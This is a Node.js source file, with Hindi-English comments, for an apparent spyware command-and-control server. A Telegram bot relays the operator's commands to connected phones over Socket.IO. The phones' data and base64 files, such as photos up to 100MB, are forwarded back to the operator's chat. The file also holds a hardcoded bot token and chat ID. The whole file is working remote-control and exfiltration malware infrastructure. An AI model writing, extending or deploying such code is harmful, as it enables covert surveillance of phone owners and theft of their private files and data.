const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf } = require('telegraf');

const app = express();
const server = http.createServer(app);

const BOT_TOKEN = '8746887497:AAHNMQ2RAMI_iu9-KUVoKum72zZIsUhh00E';
const MY_CHAT_ID = '7066124462'; 
const bot = new Telegraf(BOT_TOKEN);

// FIX 1: maxHttpBufferSize badha di gayi hai taaki badi photos (up to 100MB) handle ho sakein
const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true,
    maxHttpBufferSize: 1e8 
});

bot.on('text', (ctx) => {
    const command = ctx.message.text;
    if (command === '/start') return ctx.reply('Welcome! Send any command to the phone.');
    
    io.emit('phone_command', command);
    ctx.reply(`[>] Command Sent: ${command}`);
});

bot.catch((err) => console.error('Telegraf error', err));
bot.launch();

app.get('/', (req, res) => res.send('Server & Bot are Live!'));

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);
    bot.telegram.sendMessage(MY_CHAT_ID, `📱 Phone Connected!\nID: ${socket.id}`).catch(err => console.log(err));

    // Normal text data ke liye
    socket.on('phone_data', (data) => {
        const message = `⚠️ DATA RECEIVED ⚠️\n\n${JSON.stringify(data, null, 2)}`;
        bot.telegram.sendMessage(MY_CHAT_ID, message).catch(() => {
            bot.telegram.sendMessage(MY_CHAT_ID, "Data received but format error.");
        });
    });

    // FIX 2: FILE DOWNLOAD LOGIC (Yeh missing tha)
    socket.on('file_download', (data) => {
        try {
            // Base64 ko Buffer (binary) mein badalna
            const fileBuffer = Buffer.from(data.file_data, 'base64');
            
            // Telegram par photo ya document ke roop mein bhejna
            bot.telegram.sendDocument(MY_CHAT_ID, {
                source: fileBuffer,
                filename: data.file_name
            }, {
                caption: `✅ File Received: ${data.file_name}`
            }).then(() => {
                console.log("File sent to Telegram!");
            }).catch(err => {
                bot.telegram.sendMessage(MY_CHAT_ID, `❌ Telegram Upload Error: ${err.message}`);
            });

        } catch (err) {
            console.error("Download Error:", err);
            bot.telegram.sendMessage(MY_CHAT_ID, "⚠️ Error processing file.");
        }
    });

    socket.on('disconnect', () => {
        bot.telegram.sendMessage(MY_CHAT_ID, '❌ Phone Disconnected.').catch(err => console.log(err));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
        
